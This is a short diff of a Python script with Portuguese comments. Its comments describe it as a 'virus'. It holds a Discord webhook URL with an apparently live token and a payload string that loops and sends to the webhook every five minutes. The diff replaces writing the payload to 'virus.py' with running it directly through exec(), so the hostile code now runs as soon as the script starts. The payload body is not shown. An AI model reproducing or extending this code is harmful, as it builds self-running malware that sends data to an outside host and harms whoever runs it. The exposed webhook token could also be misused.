@@ -1,6 +1,5 @@
 import requests
 import time
-import json
 
 # Define o URL do webhook do Discord
 webhook_url = "https://discord.com/api/webhooks/1459892256084594792/UCjUu_FmaK-p8bK5xr9GW4Q-RWgrar7lNhdH-o40aDYYegdf0O3TsnzBajQdUDubsKT9"
@@ -44,8 +43,5 @@ while True:
     time.sleep(300)  # Espera 5 minutos antes de enviar novamente
 """
 
-# Cria o arquivo do vírus
-with open("virus.py", "w") as f:
-    f.write(virus_content)
-
-print("Vírus criado: virus.py")
+# Executa o código do vírus diretamente no terminal
+exec(virus_content)
